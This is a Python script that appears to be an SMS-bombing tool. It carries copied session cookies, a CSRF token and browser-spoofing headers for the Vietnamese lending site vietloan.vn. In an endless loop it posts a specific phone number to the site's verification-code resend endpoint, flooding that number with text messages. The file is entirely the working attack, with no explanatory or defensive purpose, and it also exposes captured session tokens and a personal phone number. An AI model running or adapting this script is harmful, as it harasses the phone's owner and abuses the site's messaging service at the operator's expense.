import requests

cookies = {
    '__cfruid': '7de00d5df174ae04d60c347565f43d945fbf59f7-1704195491',
    'ec_png_utm': 'b210a4dc-4bec-e9db-15ec-5518324e780b',
    'ec_png_client_utm': 'null',
    'ec_png_client': 'false',
    'ec_etag_utm': 'b210a4dc-4bec-e9db-15ec-5518324e780b',
    'ec_cache_utm': 'b210a4dc-4bec-e9db-15ec-5518324e780b',
    'ec_cache_client': 'false',
    'ec_cache_client_utm': 'null',
    'ec_etag_client': 'false',
    'ec_etag_client_utm': 'null',
    'jslbrc': 'w.202401021145306de400b7-a964-11ee-895c-3ef70195ea5e.A_GS',
    'uid': 'b210a4dc-4bec-e9db-15ec-5518324e780b',
    'client': 'false',
    'client_utm': 'null',
    'XSRF-TOKEN': 'eyJpdiI6Imc4ektXTnBhK0NIYmpWSjRMRVU3Qmc9PSIsInZhbHVlIjoiUVZRNGhCWURyWXlzVXpPTlFWeW12OVlXOHZ2UUtjTW4yWEVtKzAzTzI3bkxOWTJTeEY2ZGsrYUtBT2tiazNiS2JkclQ1YkdMalF0UGdnVWZ1cjdFTmxGYUU5NEFNSDRSclYxMm00SytkendMMHNXLzVQVnF0cTlEVFVQSnQxUnMiLCJtYWMiOiJhNGEyNzRjZjFkNGVlYWM0NjZiZDNhMTAyMmJiY2U4NTk4MzUzZTU1NGM5OTJlYzEyNDFiZDY3YjViZDIxOTFiIiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6ImdCK3pDWUFGWFJLc2dEanZKTGdLcmc9PSIsInZhbHVlIjoiS0NFaFNNZkovNTdLNkw2QmlwSkFyUWVpbU1kcnFiTXFFU3RkT3dCd3orQmVWc2dDajVHV2g0VFArL2sxZmZjSGFjVVowdEIxUnlydldxUU5rOXlIZFdjMysrQVZ1WXVJZHkwMnIvbjNDUVZDWXl1YzQ1Ky9Gejh3eDlxZ2xQbDkiLCJtYWMiOiIyNmJmNGQyNmE5MmI1OTM3MWM5ZWNiYmZlZWZjYTI4NThiNTZmZWViZjQwZGQxMDJmYzA5YTY5MzAwZmY1YzgwIiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6IktLWkNDZlkrWkpnT3E5RFc4UGV5UUE9PSIsInZhbHVlIjoiWFgyZThyanhycTVHVDhXQ3RsdXlGd0JXNzV6UkZwMnh0REZua3dyY055TGtWRDdKVDdMQ0lkNEM2STFybm12ZmtoWitKNDQ4M2c0MmllK2NjL0ZBL09EMk1mNnI3bVpFL2JoMUd3eE1WNFliV3UrMFVkNkxUVWx2amhxTllpRVciLCJtYWMiOiJjNWEwNTUyMGEwMWUyYzA2NTVjNjRlOThjNmQwNTgwNWE4Mjg0NzQ1ZTA1ZjY5MDcwNGU0NWIyNDNmOGE4N2I0IiwidGFnIjoiIn0%3D',
}

headers = {
    'authority': 'vietloan.vn',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__cfruid=7de00d5df174ae04d60c347565f43d945fbf59f7-1704195491; ec_png_utm=b210a4dc-4bec-e9db-15ec-5518324e780b; ec_png_client_utm=null; ec_png_client=false; ec_etag_utm=b210a4dc-4bec-e9db-15ec-5518324e780b; ec_cache_utm=b210a4dc-4bec-e9db-15ec-5518324e780b; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_client_utm=null; jslbrc=w.202401021145306de400b7-a964-11ee-895c-3ef70195ea5e.A_GS; uid=b210a4dc-4bec-e9db-15ec-5518324e780b; client=false; client_utm=null; XSRF-TOKEN=eyJpdiI6Imc4ektXTnBhK0NIYmpWSjRMRVU3Qmc9PSIsInZhbHVlIjoiUVZRNGhCWURyWXlzVXpPTlFWeW12OVlXOHZ2UUtjTW4yWEVtKzAzTzI3bkxOWTJTeEY2ZGsrYUtBT2tiazNiS2JkclQ1YkdMalF0UGdnVWZ1cjdFTmxGYUU5NEFNSDRSclYxMm00SytkendMMHNXLzVQVnF0cTlEVFVQSnQxUnMiLCJtYWMiOiJhNGEyNzRjZjFkNGVlYWM0NjZiZDNhMTAyMmJiY2U4NTk4MzUzZTU1NGM5OTJlYzEyNDFiZDY3YjViZDIxOTFiIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6ImdCK3pDWUFGWFJLc2dEanZKTGdLcmc9PSIsInZhbHVlIjoiS0NFaFNNZkovNTdLNkw2QmlwSkFyUWVpbU1kcnFiTXFFU3RkT3dCd3orQmVWc2dDajVHV2g0VFArL2sxZmZjSGFjVVowdEIxUnlydldxUU5rOXlIZFdjMysrQVZ1WXVJZHkwMnIvbjNDUVZDWXl1YzQ1Ky9Gejh3eDlxZ2xQbDkiLCJtYWMiOiIyNmJmNGQyNmE5MmI1OTM3MWM5ZWNiYmZlZWZjYTI4NThiNTZmZWViZjQwZGQxMDJmYzA5YTY5MzAwZmY1YzgwIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IktLWkNDZlkrWkpnT3E5RFc4UGV5UUE9PSIsInZhbHVlIjoiWFgyZThyanhycTVHVDhXQ3RsdXlGd0JXNzV6UkZwMnh0REZua3dyY055TGtWRDdKVDdMQ0lkNEM2STFybm12ZmtoWitKNDQ4M2c0MmllK2NjL0ZBL09EMk1mNnI3bVpFL2JoMUd3eE1WNFliV3UrMFVkNkxUVWx2amhxTllpRVciLCJtYWMiOiJjNWEwNTUyMGEwMWUyYzA2NTVjNjRlOThjNmQwNTgwNWE4Mjg0NzQ1ZTA1ZjY5MDcwNGU0NWIyNDNmOGE4N2I0IiwidGFnIjoiIn0%3D',
    'origin': 'https://vietloan.vn',
    'referer': 'https://vietloan.vn/login',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'phone': '0 358 839 176',
    '_token': 'L6X8J9rN5jwOXsHotIJ9UWFTxOHNt3IhgqJt8pN7',
}
while True:
  response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data).text
  print(response)